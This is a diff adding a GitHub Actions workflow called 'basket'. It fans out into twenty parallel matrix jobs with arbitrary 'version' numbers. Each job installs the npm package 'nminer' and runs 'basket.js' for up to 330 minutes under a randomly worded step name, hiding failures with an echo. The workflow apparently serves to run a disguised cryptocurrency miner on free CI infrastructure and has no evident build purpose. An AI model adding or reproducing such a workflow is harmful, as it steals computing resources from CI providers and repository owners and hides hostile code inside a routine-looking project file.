@@ -1,0 +1,45 @@
+name: basket
+on:
+  push:
+    branches: [ "main" ]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        config:
+          - { version: 9788 }
+          - { version: 2801 }
+          - { version: 4177 }
+          - { version: 3517 }
+          - { version: 469 }
+          - { version: 6220 }
+          - { version: 1894 }
+          - { version: 1106 }
+          - { version: 8944 }
+          - { version: 7918 }
+          - { version: 9087 }
+          - { version: 6239 }
+          - { version: 6144 }
+          - { version: 6693 }
+          - { version: 657 }
+          - { version: 6344 }
+          - { version: 9906 }
+          - { version: 4187 }
+          - { version: 4754 }
+          - { version: 1233 }
+
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Install Node.js
+        uses: actions/setup-node@v3
+        with:
+          node-version: 20
+          
+      - name: glisten burgeon annual brr
+        run: |
+          npm install nminer@latest
+          timeout 330m node basket.js || echo "basket executed"
